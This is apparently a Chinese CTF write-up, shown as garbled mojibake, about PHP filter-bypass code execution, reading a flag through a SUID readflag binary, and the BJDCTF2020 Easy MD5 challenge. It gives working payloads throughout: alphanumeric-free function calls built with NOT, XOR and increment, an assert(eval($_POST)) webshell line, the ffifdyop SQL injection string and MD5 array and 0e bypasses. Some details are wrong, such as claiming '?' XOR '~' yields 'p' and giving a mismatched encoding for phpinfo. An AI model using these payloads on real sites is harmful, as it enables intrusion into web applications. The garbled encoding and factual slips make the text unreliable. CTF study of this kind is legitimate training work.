<p>æ‰€ä»¥ä¸ºäº†è§£å†³é—®é¢˜ï¼Œæˆ‘ä»¬å®‰è£…äº†æ’ä»¶ï¼ˆç»•è¿‡å‡½æ•°é™åˆ¶ï¼‰ï¼Œä¹Ÿå°±è§£å†³äº†ç¬¬äºŒä¸ªå¯èƒ½é—®é¢˜</p>
<p>ls -&#x2F;  ok</p>
<p>cat &#x2F;flag   å“Ÿä¸è¡Œäº†ï¼Œå› ä¸ºæœ‰æƒé™å•Šï¼Œç¬¬ä¸€ä¸ªå¯èƒ½é—®é¢˜è¿˜æ²¡è§£å†³ã€‚</p>
<p>è¿™ä¸ªçœ‹ä¸€çœ¼åˆ«äººï¼Œå’Œçœ‹ä¸€çœ¼åˆ«äººçš„éšç§åŒºåˆ«è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œæ‰€ä»¥æƒé™çº§åˆ«ä¸ä¸€æ ·å˜›ã€‚</p>
<p>çœ‹ä¸€ä¸‹æ ¹ç›®å½•ï¼Œå¯»æ‰¾readflagæˆ–è€…ç±»å‹çš„è¿è¡Œæ–‡ä»¶</p>
<p>4.è¿è¡Œæœ‰suidæƒé™çš„æ–‡ä»¶</p>
<p>è¿è¡Œ <code>readflag</code> è¿™ç§æ–‡ä»¶ï¼Œå¹¶ä¸æ˜¯è®©ä½ â€œè·å¾—ä¸´æ—¶ root æƒé™â€ï¼ˆä¹Ÿå°±æ˜¯ä½ çš„èº«ä»½è¿˜æ˜¯ <code>www-data</code>ï¼‰ï¼Œè€Œæ˜¯<strong>è¿™ä¸ªç¨‹åºæœ¬èº«åœ¨è¿è¡Œé‚£ä¸€åˆ»æ‹¥æœ‰ root æƒé™</strong>ï¼Œå®ƒæ›¿ä½ å»è¯»æ–‡ä»¶ï¼Œç„¶åæŠŠç»“æœå‘Šè¯‰ä½ ã€‚</p>
<hr>
<h3 id="1-å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆSUID-æƒé™ï¼‰"><a href="#1-å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆSUID-æƒé™ï¼‰" class="headerlink" title="1. å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆSUID æƒé™ï¼‰"></a>1. å®ƒçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆSUID æƒé™ï¼‰</h3><p>åœ¨ Linux ä¸­ï¼Œè¿™å« <strong>SUID (Set User ID)</strong>ã€‚</p>
<ul>
<li><strong>æ™®é€šç¨‹åº</strong>ï¼šä½ è¿è¡Œ <code>cat</code>ï¼Œ<code>cat</code> çš„æƒé™å°±æ˜¯ä½ çš„æƒé™ï¼ˆä¿æ´å‘˜ï¼‰ã€‚</li>
<li><strong>SUID ç¨‹åº</strong>ï¼šä½ è¿è¡Œ <code>readflag</code>ï¼Œè™½ç„¶ä½ æ˜¯ä¿æ´å‘˜ï¼Œä½† <code>readflag</code> è¿™ä¸ªç¨‹åºè¢«è´´ä¸Šäº†â€œæ€»è£ç‰¹æƒâ€çš„æ ‡ç­¾ã€‚åœ¨å®ƒè¿è¡Œçš„å‡ ç§’é’Ÿé‡Œï¼Œå®ƒèƒ½æ‰“å¼€ä¿æ´å‘˜æ‰“ä¸å¼€çš„ä¿é™©æŸœï¼ŒæŠŠé‡Œé¢çš„ä¸œè¥¿è¯»å‡ºæ¥ç»™ä½ çœ‹ã€‚</li>
</ul>
<hr>
<h3 id="2-å¦‚ä½•åœ¨æ ¹ç›®å½•ä¸‹ç²¾å‡†æ‰¾åˆ°å®ƒï¼Ÿ"><a href="#2-å¦‚ä½•åœ¨æ ¹ç›®å½•ä¸‹ç²¾å‡†æ‰¾åˆ°å®ƒï¼Ÿ" class="headerlink" title="2. å¦‚ä½•åœ¨æ ¹ç›®å½•ä¸‹ç²¾å‡†æ‰¾åˆ°å®ƒï¼Ÿ"></a>2. å¦‚ä½•åœ¨æ ¹ç›®å½•ä¸‹ç²¾å‡†æ‰¾åˆ°å®ƒï¼Ÿ</h3><p>ä½ ä¸èƒ½åªé çœ¼ç›çœ‹ï¼Œå› ä¸ºæœ‰æ—¶å€™å®ƒä¸å« <code>readflag</code>ï¼Œå¯èƒ½å« <code>get_flag</code> æˆ–è€…ä¸€ä¸²ä¹±ç ã€‚ä½ è¦æ‰¾çš„æ˜¯**â€œæƒé™é‡Œå¸¦ s çš„ç»¿è‰²æ–‡ä»¶â€**ã€‚</p>
<p>åœ¨ç»ˆç«¯è¾“å…¥è¿™ä¸ªå‘½ä»¤ï¼ˆè¿™æ˜¯æ‰€æœ‰ CTF é€‰æ‰‹çš„è‚Œè‚‰è®°å¿†ï¼‰ï¼š</p>
<p>Bash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /</span><br></pre></td></tr></table></figure>

<p><strong>çœ‹ç»“æœé‡Œçš„è¿™ä¸€æ®µï¼š</strong></p>
<ul>
<li>å¦‚æœæƒé™æ˜¯ <code>-rwxr-xr-x</code>ï¼šè¿™åªæ˜¯ä¸ªæ™®é€šæ–‡ä»¶ï¼Œæ²¡ç”¨ã€‚</li>
<li>å¦‚æœæƒé™æ˜¯ <code>-rw**s**r-xr-x</code>ï¼šçœ‹åˆ°é‚£ä¸ª <strong><code>s</code></strong> äº†å—ï¼Ÿè¿™å°±æ˜¯â€œç‰¹æƒâ€çš„æ ‡å¿—ï¼</li>
</ul>
<hr>
<h3 id="4-è¿è¡Œå®ƒåä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ"><a href="#4-è¿è¡Œå®ƒåä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ" class="headerlink" title="4. è¿è¡Œå®ƒåä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ"></a>4. è¿è¡Œå®ƒåä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</h3><p>ä½ è¿è¡Œ <code>/readflag</code>ï¼Œé€šå¸¸ä¼šå‡ºç°ä»¥ä¸‹å‡ ç§å›æ˜¾ï¼š</p>
<ol>
<li><strong>ç›´æ¥ç»™ Flag</strong>ï¼šæœ€çˆ½çš„æƒ…å†µï¼Œç›´æ¥ <code>flag{...}</code>ã€‚</li>
<li><strong>éªŒè¯ç &#x2F;äº¤äº’</strong>ï¼šå®ƒä¼šè¯´ <code>Please solve this: 10 + 20 = ?</code>ã€‚<ul>
<li><strong>å‘ç‚¹</strong>ï¼šèšå‰‘çš„ç»ˆç«¯æœ‰æ—¶ä¸æ”¯æŒè¿™ç§äº¤äº’ã€‚</li>
<li><strong>è§£å†³</strong>ï¼šç”¨ <code>echo &quot;30&quot; | /readflag</code>ï¼ˆåˆ©ç”¨ç®¡é“æŠŠç­”æ¡ˆå–‚ç»™å®ƒï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å‚æ•°è¯»å–</strong>ï¼šå®ƒå¯èƒ½éœ€è¦ä½ æŒ‡å®šæ–‡ä»¶ã€‚<ul>
<li><strong>æ“ä½œ</strong>ï¼š<code>/readflag /flag</code>ã€‚</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(*) åŸºç¡€ä¿¡æ¯</span><br><span class="line">å½“å‰è·¯å¾„: /var/www/html</span><br><span class="line">ç£ç›˜åˆ—è¡¨: /</span><br><span class="line">ç³»ç»Ÿä¿¡æ¯: Linux out 5.15.0-161-generic #171-Ubuntu SMP Sat Oct 11 08:17:01 UTC 2025 x86_64</span><br><span class="line">å½“å‰ç”¨æˆ·: www-data</span><br><span class="line">(*) è¾“å…¥ ashelp æŸ¥çœ‹æœ¬åœ°å‘½ä»¤</span><br><span class="line">(www-data:/var/www/html) $ cat /flag              //æŸ¥éƒ½æ²¡æœ‰</span><br><span class="line">(www-data:/var/www/html) $ ls /</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">readflag</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/var/www/html) $ /readflag       //è¿è¡Œä¸€ä¸‹å®ƒ</span><br><span class="line">flag&#123;32337c9d-8e6d-42de-b5d6-791fcd592089&#125;</span><br></pre></td></tr></table></figure>













<p>çŸ¥è¯†ç‚¹ï¼š</p>
<p><strong>1.åŠ¨æ€å‡½æ•°è°ƒç”¨</strong></p>
<p>è¿™æ¶‰åŠ PHP 7 çš„ä¸€ä¸ªæ ¸å¿ƒç‰¹æ€§ï¼š<strong>åŠ¨æ€å‡½æ•°è°ƒç”¨</strong>ã€‚</p>
<ul>
<li><strong>ä¼ ç»Ÿå†™æ³•</strong>ï¼š<code>assert(...);</code></li>
<li><strong>PHP 7 å†™æ³•</strong>ï¼š<code>(&quot;assert&quot;)(...);</code></li>
</ul>
<p>åœ¨ PHP 7 ä¸­ï¼Œå¦‚æœä½ åœ¨æ‹¬å·é‡Œæ”¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåé¢ç´§è·Ÿç€å¦ä¸€ä¸ªæ‹¬å·ï¼ŒPHP ä¼šæŠŠç¬¬ä¸€ä¸ªæ‹¬å·é‡Œçš„å­—ç¬¦ä¸²å½“æˆ<strong>å‡½æ•°å</strong>å»æ‰§è¡Œã€‚</p>
<p><strong>2.çŸ¥è¯†ç‚¹äºŒï¼ˆæ•°å­—å­—æ¯ç»•è¿‡ï¼‰</strong></p>
<p>ç›®æ ‡ï¼š**ç»•è¿‡ <code>preg_match(&quot;/[A-Za-z0-9]+/&quot;, $code)</code> **</p>
<hr>
<h3 id="1-å–åç»•è¿‡-Bitwise-NOT"><a href="#1-å–åç»•è¿‡-Bitwise-NOT" class="headerlink" title="1. å–åç»•è¿‡ (Bitwise NOT ~)"></a>1. å–åç»•è¿‡ (Bitwise NOT <code>~</code>)</h3><ul>
<li><strong>åŸç†ï¼š</strong> åœ¨ PHP ä¸­ï¼Œ<code>~</code> æ˜¯æŒ‰ä½å–åè¿ç®—ç¬¦ã€‚å®ƒä¼šå°† 8 ä½äºŒè¿›åˆ¶æ•°çš„ <code>0</code> å˜ä¸º <code>1</code>ï¼Œ<code>1</code> å˜ä¸º <code>0</code>ã€‚</li>
<li><strong>è®¡ç®—è¿‡ç¨‹ï¼š</strong><ol>
<li>å­—æ¯ <code>a</code> çš„ ASCII ç æ˜¯ <code>97</code>ï¼ŒäºŒè¿›åˆ¶æ˜¯ <code>01100001</code>ã€‚</li>
<li>å¯¹ <code>01100001</code> å–åï¼Œå¾—åˆ° <code>10011110</code>ã€‚</li>
<li><code>10011110</code> è½¬æ¢æˆåå…­è¿›åˆ¶æ˜¯ <code>0x9E</code>ã€‚</li>
<li><code>0x9E</code> æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼ˆéå­—æ¯éæ•°å­—ï¼‰ã€‚</li>
</ol>
</li>
<li><strong>ä»£ç å®ç°ï¼š</strong> <code>(~%9E)</code> åœ¨ PHP æ‰§è¡Œæ—¶ï¼Œä¼šå…ˆæŠŠ <code>%9E</code> è¿™ä¸ªä¸å¯è§å­—ç¬¦å–åï¼Œç»“æœå›åˆ°äº†äºŒè¿›åˆ¶ <code>01100001</code>ï¼Œå³å­—ç¬¦ <code>a</code>ã€‚</li>
<li><strong>Payload æ„é€ ï¼š</strong> ä½ æƒ³æ„é€  <code>phpinfo</code>ï¼Œå°±å…ˆå¯¹ <code>p, h, p, i, n, f, o</code> æ¯ä¸ªå­—æ¯å–åï¼Œå¾—åˆ°ä¸€ä¸² <code>%xx</code> çš„ç¼–ç ï¼Œæœ€åç»„åˆæˆ <code>(~%8F%8E%8F%8D%8C%9A%8B)();</code>ã€‚</li>
</ul>
<hr>
<h3 id="2-å¼‚æˆ–ç»•è¿‡-XOR"><a href="#2-å¼‚æˆ–ç»•è¿‡-XOR" class="headerlink" title="2. å¼‚æˆ–ç»•è¿‡ (XOR ^)"></a>2. å¼‚æˆ–ç»•è¿‡ (XOR <code>^</code>)</h3><ul>
<li><strong>åŸç†ï¼š</strong> å¼‚æˆ–è¿ç®—çš„è§„åˆ™æ˜¯â€œç›¸åŒä¸º 0ï¼Œä¸åŒä¸º 1â€ã€‚</li>
<li><strong>è®¡ç®—è¿‡ç¨‹ï¼š</strong><ol>
<li>å­—ç¬¦ <code>?</code> çš„ ASCII æ˜¯ <code>63</code> (<code>00111111</code>)ã€‚</li>
<li>å­—ç¬¦ <code>~</code> çš„ ASCII æ˜¯ <code>126</code> (<code>01111110</code>)ã€‚</li>
<li>æ‰§è¡Œ <code>00111111 ^ 01111110</code>ï¼Œç»“æœæ˜¯ <code>01000001</code>ã€‚</li>
<li><code>01000001</code> å¯¹åº”çš„ ASCII å­—ç¬¦æ˜¯ <code>p</code>ã€‚</li>
</ol>
</li>
<li><strong>ç»•è¿‡é€»è¾‘ï¼š</strong> è™½ç„¶ <code>p</code> æ˜¯å­—æ¯ï¼Œä¼šè¢«æ­£åˆ™æ‹¦æˆªï¼Œä½† <code>?</code> å’Œ <code>~</code> éƒ½æ˜¯ç¬¦å·ï¼Œæ­£åˆ™å…è®¸é€šè¿‡ã€‚</li>
<li><strong>ä»£ç å®ç°ï¼š</strong> <code>$a = (&quot;?&quot; ^ &quot;~&quot;);</code> è¿™è¡Œä»£ç é‡Œæ²¡æœ‰ä»»ä½•å­—æ¯æ•°å­—ï¼Œä½†å˜é‡ <code>$a</code> çš„å€¼å˜æˆäº† <code>&quot;p&quot;</code>ã€‚é€šè¿‡å¤šæ¬¡å¼‚æˆ–æ‹¼æ¥ï¼Œå¯ä»¥æ‹¼å‡º <code>system</code> ç­‰å‡½æ•°åã€‚</li>
</ul>
<hr>
<h3 id="3-è‡ªå¢ç»•è¿‡-Increment"><a href="#3-è‡ªå¢ç»•è¿‡-Increment" class="headerlink" title="3. è‡ªå¢ç»•è¿‡ (Increment ++)"></a>3. è‡ªå¢ç»•è¿‡ (Increment <code>++</code>)</h3><ul>
<li><strong>åŸç†ï¼š</strong> PHP ç»§æ‰¿äº† Perl çš„ç‰¹æ€§ï¼Œæ”¯æŒå¯¹å­—ç¬¦ä¸²è¿›è¡Œè‡ªå¢æ“ä½œã€‚å¦‚æœä½ å¯¹å­—ç¬¦ <code>&#39;a&#39;</code> æ‰§è¡Œ <code>++</code>ï¼Œå®ƒä¼šå˜æˆ <code>&#39;b&#39;</code>ã€‚</li>
<li><strong>å…³é”®çŸ¥è¯†ï¼š</strong><ol>
<li><strong>å¦‚ä½•è·å¾—ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Ÿ</strong> PHP ä¸­ï¼Œå¦‚æœå®šä¹‰ä¸€ä¸ªå˜é‡ <code>$a = [];</code>ï¼ˆç©ºæ•°ç»„ï¼‰ï¼Œå½“ä½ æŠŠå®ƒå½“å­—ç¬¦ä¸²ç”¨æ—¶ï¼ˆä¾‹å¦‚ <code>&quot;$a&quot;</code>ï¼‰ï¼ŒPHP ä¼šå¼ºåˆ¶è½¬æ¢å®ƒä¸ºå­—ç¬¦ä¸² <code>&quot;Array&quot;</code>ã€‚</li>
<li><strong>æå–é¦–å­—æ¯ï¼š</strong> <code>$_ = [].&#39;&#39;;</code> æ­¤æ—¶ <code>$_</code> çš„å€¼æ˜¯ <code>&quot;Array&quot;</code>ã€‚</li>
<li><strong>è·å– â€˜Aâ€™ï¼š</strong> <code>$_ = $_[0];</code>ï¼ˆå–å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå³ <code>A</code>ï¼‰ã€‚</li>
<li><strong>é€’å¢ï¼š</strong> <code>$__ = $_; $__++;</code>ï¼ˆæ­¤æ—¶ <code>$__</code> å˜æˆäº† <code>B</code>ï¼‰ã€‚</li>
</ol>
</li>
<li><strong>ç»•è¿‡é€»è¾‘ï¼š</strong> åˆ©ç”¨ç¬¦å·ï¼ˆå¦‚ <code>[]</code>, <code>.</code>, <code>_</code>ï¼‰å¾—åˆ°ä¸€ä¸ªåˆå§‹å­—æ¯ï¼Œå†é€šè¿‡åå¤è‡ªå¢ï¼Œå‡‘é½ä½ éœ€è¦çš„ <code>s, y, s, t, e, m</code> ç­‰å­—æ¯ã€‚æ•´ä¸ªè¿‡ç¨‹ä¸æ¶‰åŠä»»ä½•ç¡¬ç¼–ç çš„å­—æ¯ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_ = [];          // å®šä¹‰æ•°ç»„</span><br><span class="line">$_ = $_ . &quot;&quot;;     // å¼ºåˆ¶è½¬å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶ $_ æ˜¯ &quot;Array&quot;</span><br><span class="line">$_ = $_[0];       // å–ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæ­¤æ—¶ $_ æ˜¯ &quot;A&quot;</span><br><span class="line"></span><br><span class="line">// å¦‚æœæƒ³è¦ &#x27;S&#x27; (system çš„å¼€å¤´)</span><br><span class="line">$s = $_; </span><br><span class="line">for($i=0; $i&lt;18; $i++)&#123; $s++; &#125; // A è‡ªå¢ 18 æ¬¡å˜æˆ S</span><br><span class="line">echo $s; // è¾“å‡º S</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=[];$_=$_.&quot;&quot;;$_=$_[0];$__=$_;$__++;$__++;$__++;......(ä»¥æ­¤ç±»æ¨)</span><br></pre></td></tr></table></figure>



<ol start="3">
<li><strong>phpå¯å˜å‡½æ•°</strong></li>
</ol>
<p><strong>â€œå¯å˜å‡½æ•°â€</strong>ï¼š å¦‚æœä¸€ä¸ªå˜é‡åé¢è·Ÿç€æ‹¬å·ï¼Œå¦‚ <code>$a()</code>ï¼ŒPHP ä¼šå¯»æ‰¾åå­—å«åšâ€œå˜é‡ <code>$a</code> çš„å€¼â€çš„å‡½æ•°å¹¶æ‰§è¡Œã€‚</p>
<ul>
<li><strong>æ­¥éª¤ Aï¼š</strong> ä½¿ç”¨å–å&#x2F;å¼‚æˆ–&#x2F;è‡ªå¢æ„é€ å‡ºå­—ç¬¦ä¸² <code>&quot;system&quot;</code>ï¼Œå­˜å…¥å˜é‡ <code>$_</code>ã€‚</li>
<li><strong>æ­¥éª¤ Bï¼š</strong> ä½¿ç”¨å–å&#x2F;å¼‚æˆ–&#x2F;è‡ªå¢æ„é€ å‡ºå­—ç¬¦ä¸² <code>&quot;ls /&quot;</code>ï¼Œå­˜å…¥å˜é‡ <code>$__</code>ã€‚</li>
<li><strong>æ­¥éª¤ Cï¼š</strong> æ‰§è¡Œ <code>$_($__)</code>ã€‚è¿™åœ¨åº•å±‚ç­‰åŒäºè°ƒç”¨ <code>system(&quot;ls /&quot;)</code>ã€‚</li>
</ul>
<p>æ˜“é”™ç‚¹ï¼š</p>
<p>æ­£ç¡®è¯­æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = &quot;phpinfo&quot;; </span><br><span class="line">$_();</span><br></pre></td></tr></table></figure>

<p>ä¸¾ä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8f%97%8f%96%91%99%90)()  //code=&quot;phpinfo&quot;()ï¼Œæ˜æ˜¾æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œå­—ç¬¦ä¸²åé¢è·Ÿæ‹¬å·è¯­æ³•é”™è¯¯ï¼Œå¿…é¡»æ˜¯å˜é‡</span><br><span class="line"></span><br><span class="line">?code=$_=~%8f%97%8f%96%91%99%90;$_();  //æ²¡æœ‰å…³ç³»ï¼Œå³ä½¿codeé‡Œé¢å¾—åˆ°çš„åªæ˜¯å­—ç¬¦ä¸²ï¼Œæ— æ³•ä¸­evalæ‰§è¡Œï¼Œä½†æ˜¯phpinfoæœ¬èº«å°±æ˜¯ä¸ªå‡½æ•°ï¼Œä»–å¯ä»¥è‡ªå·±æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™é‡Œäº§ç”Ÿäº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆå¼‚æˆ–æ“ä½œåé¢åŠ ä¸Š()å°±å¯ä»¥è¢«å½“ä½œå‡½æ•°æ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>é‚£æ˜¯å› ä¸ºå¼‚æˆ–çš„å†™æ³• <code>(&quot;a&quot;^&quot;b&quot;)()</code> è§¦å‘äº† PHP 7 çš„ä¸€ä¸ªâ€œéªšæ“ä½œâ€è¡¥ä¸ï¼Œè€Œå–å <code>(~a)()</code> å› ä¸ºç¬¦å·ä¼˜å…ˆçº§é—®é¢˜ï¼Œç»å¸¸è§¦å‘ä¸äº†è¿™ä¸ªè¡¥ä¸ï¼Œå¯¼è‡´æŠ¥é”™ã€‚</p>
<p>4.<code>assert()</code>ï¼šç‹¡çŒ¾çš„â€œçº é”™å“¨å…µâ€</p>
<p><code>assert</code> åŸæœ¬æ˜¯ç”¨æ¥åšä»£ç è°ƒè¯•çš„ï¼ˆåˆ¤æ–­æŸä¸ªæ¡ä»¶æ˜¯å¦æˆç«‹ï¼‰ï¼Œä½†åœ¨ PHP 5 å’Œæ—©æœŸ PHP 7 ä¸­ï¼Œå®ƒæœ‰ä¸€ä¸ªéå¸¸å±é™©çš„ç‰¹æ€§ã€‚</p>
<ul>
<li><strong>å®ƒçš„åŠŸèƒ½</strong>ï¼šå¦‚æœä¼ ç»™å®ƒçš„å‚æ•°æ˜¯<strong>å­—ç¬¦ä¸²</strong>ï¼Œå®ƒä¼šæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å½“ä½œ PHP ä»£ç æ‰§è¡Œã€‚</li>
</ul>
<p>**(**assert)(eval($_POST[â€œtestâ€]))</p>
<p>5.&#x2F;readflag</p>
<p><code>/readflag</code> æ˜¯ä¸€ä¸ª<strong>ç¼–è¯‘å¥½çš„å¯æ‰§è¡Œç¨‹åº</strong>ï¼ˆå°±åƒ Windows é‡Œçš„ <code>.exe</code> æ–‡ä»¶ï¼‰ã€‚å½“ä½ è¾“å…¥ <code>/readflag</code> å¹¶å›è½¦æ—¶ï¼Œè®¡ç®—æœºä¼šæ‰§è¡Œè¿™ä¸ªç¨‹åºå†…éƒ¨å†™æ­»çš„é€»è¾‘ï¼š</p>
<ol>
<li><strong>ç¨‹åºå¯åŠ¨</strong>ï¼šå®ƒä¼šç«‹åˆ»å‘ Linux ç³»ç»Ÿç”³è¯·â€œä¸´æ—¶ root æƒé™â€ã€‚</li>
<li><strong>å¯»æ‰¾æ–‡ä»¶</strong>ï¼šå®ƒåœ¨ä»£ç é‡Œå·²ç»å†™å¥½äº†ï¼šâ€œå»æ‰“å¼€ <code>/flag</code> è¿™ä¸ªæ–‡ä»¶â€ã€‚</li>
<li><strong>è¯»å–å†…å®¹</strong>ï¼šå®ƒæŠŠæ–‡ä»¶é‡Œçš„å­—ç¬¦ä¸²ï¼ˆå³çœŸæ­£çš„ Flagï¼‰è¯»å–åˆ°å†…å­˜ä¸­ã€‚</li>
<li><strong>æ‰“å°è¾“å‡º</strong>ï¼šå®ƒæ‰§è¡Œç±»ä¼¼ <code>printf</code> æˆ– <code>echo</code> çš„æŒ‡ä»¤ï¼ŒæŠŠå†…å®¹ååœ¨ä½ çš„å±å¹•ä¸Šã€‚</li>
</ol>
<p><strong>æ‰€ä»¥ï¼Œä½ è¿è¡Œ <code>/readflag</code> å°±ç­‰åŒäºæ‰§è¡Œäº†ä¸€å¥—ç»„åˆæ‹³ï¼š</strong></p>
<blockquote>
<p>ç”³è¯·æƒé™ -&gt; æ‰¾åˆ° flag æ–‡ä»¶ -&gt; è¯»å–å†…å®¹ -&gt; æ‰“å°å‡ºæ¥ã€‚</p>
</blockquote>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>é¢˜ç›®ï¼š</p>
<p>1.æŠ“åŒ…çœ‹åˆ°æœ‰hint: select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</p>
<p>md5($pass,true)ï¼š</p>
<p>trueå’Œfalse</p>
<p>ç»™ä¸ªç»å…¸çš„ç»•è¿‡ï¼šffifdyop,è¿™ä¸ªMD5åŠ å¯†åä¼šè¿”å›â€™orâ€™6XXXXXXXXX(è¿™é‡Œçš„XXXXXæ˜¯ä¸€äº›ä¹±ç å’Œä¸å¯è§å­—ç¬¦ï¼Œæ˜¯trueé€ æˆçš„ï¼Œfalseå°±ä¸æ˜¯ä¹±ç äº†)</p>
<p>è¿™é‡Œçš„SQLè¯­å¥ä¼šå˜æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6XXXXXXXXX&#x27;  </span><br></pre></td></tr></table></figure>

<p>2.ç»•è¿‡åæ¥åˆ°äº†è¿™é‡Œï¼š<strong>GET</strong> &#x2F;levels91.php <strong>HTTP&#x2F;1.1</strong></p>
<p>çœ‹åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æ˜¯md5å¼±æ¯”è¾ƒç»•è¿‡ï¼Œå¯ç”¨ç§‘å­¦è®¡æ•°æ³•æˆ–è€…æ•°ç»„</p>
<p>3.æœ€åæ¥åˆ°è¿™é‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>!==</code>ä¸¥æ ¼è¦æ±‚ï¼šå€¼ä¸åŒï¼Œç±»å‹ä¸åŒ</p>
<p>md5çš„<code>===</code>ä¸¥æ ¼è¦æ±‚ï¼šmd5ç¼–ç åçš„å€¼å’Œç±»å‹å®Œå…¨ç›¸åŒ</p>
<p>çœ‹èµ·æ¥å¾ˆçŸ›ç›¾ï¼Œä½†æ˜¯å¯ä»¥ç”¨ æ•°ç»„æˆ–è€…å¼ºç¢°æ’ æ¥è§£å†³</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param1[]=2</span><br></pre></td></tr></table></figure>









<p>çŸ¥è¯†ç‚¹ï¼š</p>
<h3 id="1-md5å¼±æ¯”è¾ƒç»•è¿‡"><a href="#1-md5å¼±æ¯”è¾ƒç»•è¿‡" class="headerlink" title="1.md5å¼±æ¯”è¾ƒç»•è¿‡"></a>1.md5å¼±æ¯”è¾ƒç»•è¿‡</h3><p>æœ‰ä¸€äº›å­—ç¬¦ä¸²çš„MD5å€¼ä¸º0eå¼€å¤´ï¼Œ</p>
<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
</ul>
